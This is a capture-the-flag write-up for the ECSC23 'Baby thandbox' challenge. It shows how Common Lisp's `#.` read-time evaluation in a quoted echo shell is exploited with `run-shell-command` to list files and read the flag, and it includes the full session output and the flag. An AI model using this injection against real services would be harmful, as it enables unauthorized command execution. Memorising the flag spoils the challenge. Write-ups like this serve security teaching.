# Baby thandbox
> We found an old server with some strange shell.
>
> `nc baby-thandbox.ecsc23.hack.cert.pl 5003`
>
> ```lisp
> (defun echo ()
>     (princ "> ")
>     (setq cmd (read))
>     (case cmd
>         ('help (princ "Available commands:")(print "help")(print "flag")(print "quit"))
>         ('flag (princ "you wish"))
>         ('quit (quit))
>         (otherwise (prin1 cmd)))
>     (terpri)
>     (echo))
> (handler-case
>     (echo)
>     (error (e) (prin1 e)(quit)))
> (quit)
> ```

## read function
The language used in this challenge is Common Lisp. In Common Lisp, the read function automatically parses a representation of an object from stdin. If the representation starts with `#.`, it is automatically evaluated. Common Lisp also defines `run-shell-command`, which is pretty self-explanatory. The final attack looks like this:
```sh
$ nc baby-thandbox.ecsc23.hack.cert.pl 5003
;; Loading file /sandbox ...
> #.(run-shell-command "ls")
bin
etc
flag_144de66289ad4b9ffa8578cb862c7db7.txt
lib
lib64
root
sandbox
sbin
usr
NIL
> #.(run-shell-command "cat flag_144de66289ad4b9ffa8578cb862c7db7.txt")
ecsc23{LISP_is_a_speech_defect_in_which_s_is_pronounced_like_th_in_thick}NIL
>
```

## Flag
`ecsc23{LISP_is_a_speech_defect_in_which_s_is_pronounced_like_th_in_thick}`